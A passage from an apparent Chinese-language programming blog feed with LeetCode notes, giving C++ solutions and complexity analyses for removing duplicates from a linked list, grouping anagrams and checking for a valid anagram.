class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">Node *first, *current;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(Node *first)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Node * <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// Define a 4-nodes linked list</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node4</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node3</span><span class="params">(<span class="number">3</span>, &amp;node4)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node2</span><span class="params">(<span class="number">2</span>, &amp;node3)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node1</span><span class="params">(<span class="number">1</span>, &amp;node2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print the list</span></span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">deleteDuplicates</span>(&amp;node1);</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(Node *first)</span></span>&#123;</span><br><span class="line">    Node * current = first;</span><br><span class="line">    <span class="keyword">if</span>(current!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> ( current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cout &lt;&lt; current-&gt;val &lt;&lt; <span class="string">&quot;-&gt;&quot;</span> ;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Emppty List&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;NULL&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node * <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">    Node * ansHead = head;</span><br><span class="line">    Node * current = head;</span><br><span class="line">    Node *previous  =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == head)&#123; <span class="comment">// head</span></span><br><span class="line">            previous = current;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="comment">// the following nodes</span></span><br><span class="line">            <span class="keyword">while</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != <span class="literal">NULL</span> )&#123;</span><br><span class="line">                ListNode* temp = current-&gt;next;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">                previous -&gt; next = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                ListNode* temp = current-&gt;next;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">                previous -&gt; next = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                current = current-&gt; next;</span><br><span class="line">                previous = previous-&gt;next;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ansHead;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/83/results1.jpeg"></p><h2 id="其他作法"><a href="#其他作法" class="headerlink" title="其他作法"></a>其他作法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head) <span class="keyword">return</span> <span class="literal">nullptr</span>; <span class="comment">// 如果鏈表為空，返回 nullptr</span></span><br><span class="line"></span><br><span class="line">        ListNode* current = head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (current &amp;&amp; current-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;val == current-&gt;next-&gt;val) &#123;</span><br><span class="line">                ListNode* temp = current-&gt;next; <span class="comment">// 暫存重複節點</span></span><br><span class="line">                current-&gt;next = current-&gt;next-&gt;next; <span class="comment">// 跳過重複節點</span></span><br><span class="line">                <span class="keyword">delete</span> temp; <span class="comment">// 釋放重複節點的記憶體</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                current = current-&gt;next; <span class="comment">// 移動到下一節點</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>這裡的作法是如果有重複，直接將當前節點跳過重複節點，透過 <code>-&gt;next-&gt;next</code> 來存取下下個節點</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/83/results2.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><p>外層 while 迴圈: 這個迴圈遍歷整個list，每個節點訪問一次，因此總共執行 <strong>n</strong> 次，其中 n 是list的節點數。</p></li><li><p>內層 while 迴圈: 這個迴圈在遇到重複的節點時會執行，並且最多也只會執行 <strong>n</strong> 次（因為每次內層迴圈執行都會將 <code>current</code> 推進至少一個節點，從而保證內層迴圈的總執行次數不會超過節點數 <strong>n</strong>）。</p></li><li><p>其他操作: 內部的條件判斷和指針操作都是常數時間的操作</p></li></ul><p>整個程式碼的時間複雜度為 $O(n)%，因為每個節點最多被訪問兩次（一次在外層迴圈，一次在內層迴圈）</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>額外變數: 只使用了少量的額外變數 (<code>ansHead</code>，<code>current</code>，<code>previous</code> 和 <code>temp</code>)，這些變數的數量與list的大小無關，是常數個數。</li><li>並沒有使用額外的動態記憶體，創建了臨時<code>temp</code> 並不影響整體的空間複雜度。</li></ul><p>因此，空間複雜度為 $O(1)$，即常數空間複雜度</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次算是第一次用 c++ 寫 linked list題目，但沒用到 <strong>std:list</strong> 有點可惜，因為原本只是想要練習STL用法的 XD<br>但想法主要還是跟C一樣，就當多一題 C 的練習吧</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Group Anagrams | Medium |LeetCode#49 Group Anagrams</title>
      <link href="/posts/e106a70e.html"/>
      <url>/posts/e106a70e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/49/Question.png"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 題目要求給定一個字串陣列 <code>strs</code>，需要將 Anagrams 分組，並且回傳經過分組過的陣列，回傳陣列中的Anagrams 可以是任何順序</li></ul><blockquote><p>Anagram 代表兩個單字裡面組成的字母和數量是完全一樣的，簡單來說 Anagram 就是由A單字重新排列組合成一個B單字。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ol><li>迭代 Input Vector</li><li>為每個Obj 建立Table</li><li>迭代 Vector 檢查是否有其他匹配的 Pair</li><li>如果有 insert item</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>我後來沒有在時間內解出來，因此還是參考了一下網路上的作法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">charCounts</span>(strs.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Step1 - Build the hash table </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;strs.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="comment">//iterate the string</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c: strs[i])&#123;</span><br><span class="line">                charCounts[i][c -<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Step2 - group the anagram</span></span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; groups;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            string key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> count : charCounts[i]) &#123;</span><br><span class="line">                key += <span class="built_in">to_string</span>(count) + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            key.<span class="built_in">pop_back</span>(); <span class="comment">// 移除最後一個多餘的&quot;#&quot;</span></span><br><span class="line">            groups[key].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3 - Store grouped anagrams in the result vector</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; group : groups) &#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(group.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>初始化變數</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">charCounts</span>(strs.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>,<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li><code>ans</code> 是要return 的結果</li><li><code>charCounts</code> 是一個二維向量,用於存儲每個字串中各個字元的出現次數。它的大小與輸入字串的數量相同,每個內層向量的長度為 26,對應 26 個小寫英文字母的出現次數。</li></ul><p>建構 Hash Table</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;strs.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: strs[i])&#123;</span><br><span class="line">        charCounts[i][c -<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>迴圈循環遍歷每個字串,並計算每個字串中各個字元的出現次數,存儲在 <code>charCounts</code> 中</li></ul><p>將 anagrams 分組：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;string, vector&lt;string&gt;&gt; groups;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    string key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> count : charCounts[i]) &#123;</span><br><span class="line">        key += <span class="built_in">to_string</span>(count) + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    key.<span class="built_in">pop_back</span>(); <span class="comment">// 移除最後一個多餘的&quot;#&quot;</span></span><br><span class="line">    groups[key].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>定義了一個 <code>unordered_map</code> 類型的變數 groups,鍵是字串類型,值是一個向量,用於存儲具有相同字元計數的字串</li><li>對於每個字串,程式碼首先構建一個字串 key,該字串是通過將對應的字元計數向量中的每個元素連接而成的。例如,如果字符計數向量為 [1, 0, 1, 0, …],那麼對應的鍵字符串將是 “1#0#1#0#…”。</li><li>然後,程式碼使用這個 key 作為鍵,將當前字串插入到 groups 中對應的向量中</li></ul><p>儲存分組結果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; group : groups) &#123;</span><br><span class="line">    ans.<span class="built_in">push_back</span>(group.second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最後,程式碼遍歷 groups 中的每個鍵值對,將每個值向量(即每組 Anagram)添加到 <code>ans</code>中。</p><p>返回結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return ans;</span><br></pre></td></tr></table></figure><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/49/results.png"></p><blockquote><p>好像其實執行時間跟空間使用都不太優…</p></blockquote><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line"></span><br><span class="line">        unordered_map &lt;string, vector&lt;string&gt;&gt; Dict;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build hash table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c: strs)&#123;</span><br><span class="line">            string word = c;</span><br><span class="line">            <span class="built_in">sort</span>(word.<span class="built_in">begin</span>(), word.<span class="built_in">end</span>());</span><br><span class="line">            Dict[word].<span class="built_in">push_back</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Build the results</span></span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x: Dict)&#123; </span><br><span class="line">            ans.<span class="built_in">push_back</span>(x.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>這個做法反而更簡潔，空間複雜度也更低</p></blockquote><ul><li>首先一樣透過 <code>unordered_map</code> 去初始化一個 Dict</li><li>接著就是要建立 Hash Table，首先透過在for迴圈內用 c 去迭代輸入字串陣列 <code>strs</code></li><li>對於每個字串，我們建立一個新的字串變數 <code>word</code> 來儲存，接著就是將 <code>word</code> 進行排序，如果有Anagram，他們做sorting 後的結果也會一樣</li><li>然後就是在我們的 HashTable的Key中放入排序過後的  <code>word</code>，而value 則是存放對應的輸入字串，我們使用 <code>push_back()</code> 將每個字串加入對應value的最尾端</li><li>最後就是要建立回傳的vector，並且我們將value的值，寫到用於回傳的 <code>ans</code> vector 中</li></ul><p>我們的 Hash Table 會長的像是這樣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;aet&quot;: [&quot;eat&quot;, &quot;tea&quot;, &quot;ate&quot;],</span><br><span class="line">  &quot;ant&quot;: [&quot;tan&quot;, &quot;nat&quot;],</span><br><span class="line">  &quot;abt&quot;: [&quot;bat&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而回傳的 <code>ans</code> 會長的像是這樣：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [&quot;eat&quot;, &quot;tea&quot;, &quot;ate&quot;],</span><br><span class="line">  [&quot;tan&quot;, &quot;nat&quot;],</span><br><span class="line">  [&quot;bat&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/49/results2.png"></p><blockquote><p>在空間使用方面完勝之前的寫法</p></blockquote><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><p>以下分析原始寫法的時間以及空間複雜度</p><h2 id="時間複雜度-1"><a href="#時間複雜度-1" class="headerlink" title="時間複雜度-1"></a>時間複雜度-1</h2><p>時間複雜度為 $O(n * k)$, 其中 $n$ 是字串的數量, $k$ 是字串的平均長度</p><h2 id="空間複雜度-1"><a href="#空間複雜度-1" class="headerlink" title="空間複雜度-1"></a>空間複雜度-1</h2><p>空間複雜度為 $O(n * k)$, 因為需要創建 <code>charCounts</code> 和 <code>groups</code> 這兩個額外的數據結構。</p><p>接下來是第二種寫法的時間以及空間複雜度</p><h2 id="時間複雜度-2"><a href="#時間複雜度-2" class="headerlink" title="時間複雜度-2"></a>時間複雜度-2</h2><ul><li>在第一個 for 循環中,對於每個字串,需要執行以下操作:<ul><li>創建一個新的字串 <code>word</code>。這個操作的時間複雜度為 $O(k)$, 其中 $k$ 是字串的長度。</li><li>對 <code>word</code> 進行排序。排序操作的時間複雜度為 $O(k log k)$。</li><li>將原字串插入到Hash Table <code>Dict</code> 中對應的向量中。這個操作的時間複雜度為 $O(1)$。</li><li>因此,第一個循環的總時間複雜度為 $O(n * k * (k + k log k))$ &#x3D; $O(n * k^2 log k)$ ,其中 $n$ 是字串的數量。</li></ul></li><li>在第二個 for 循環中,需要遍歷Hash Table <code>Dict</code> 並將每個向量添加到 <code>ans</code> 中。這個操作的時間複雜度為 $O(n * k)$, 因為需要遍歷所有字串。</li><li>綜合起來,整個程式碼的時間複雜度為 $O(n * k^2 log k)$。</li></ul><h2 id="空間複雜度-2"><a href="#空間複雜度-2" class="headerlink" title="空間複雜度-2"></a>空間複雜度-2</h2><ul><li>需要創建一個Hash Table <code>Dict</code>,Hash Table中的Key是經過排序的字串,值是一個向量。在最壞情況下,所有字串都是不同的Anagram,因此Table的大小為 $O(n)$。</li><li>每個向量中存儲的是原始字串,因此所有向量的總空間為 $O(n * k)$</li><li>最終結果 <code>ans</code> 的空間複雜度也是 $O(n * k)$。</li></ul><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>透過這題，再次了解到自己對於C++ STL 的不熟悉，只能繼續努力了</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效的 Anagram | Easy |LeetCode#242 Valid Anagram</title>
      <link href="/posts/33d7b700.html"/>
      <url>/posts/33d7b700.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/242/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目要求給定兩個字串 <code>s</code> 與 <code>t</code>，若 <code>t</code> 為 <code>s</code> 的 Anagram，則回傳 true，若不是則回傳 false</li></ul><blockquote><p>Anagram 代表兩個單字裡面組成的字母和數量是完全一樣的，簡單來說 Anagram 就是由A單字重新排列組合成一個B單字。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這次的想法一樣是建立 HashTable，所以一開始的想法如下:</p><ul><li>迭代 <code>s</code>，建立 HashTable</li><li>迭代 <code>t</code>，依序檢查字母是否有出現在 HashTable，進行比對</li><li>迭代完畢後，若全部匹配則回傳True</li><li>若無則否</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//character, times</span></span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; Dict;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="comment">// If the lengths are different, they cannot be anagrams</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build the dictionary</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            Dict[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;t.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="comment">// Match</span></span><br><span class="line">            <span class="keyword">if</span> (Dict.<span class="built_in">find</span>(t[i]) != Dict.<span class="built_in">end</span>())&#123;</span><br><span class="line">                Dict[t[i]]--;</span><br><span class="line">                <span class="keyword">if</span>(Dict[t[i]] == <span class="number">0</span>)&#123;</span><br><span class="line">                    Dict.<span class="built_in">erase</span>(t[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;  <span class="comment">//Not match</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!Dict.<span 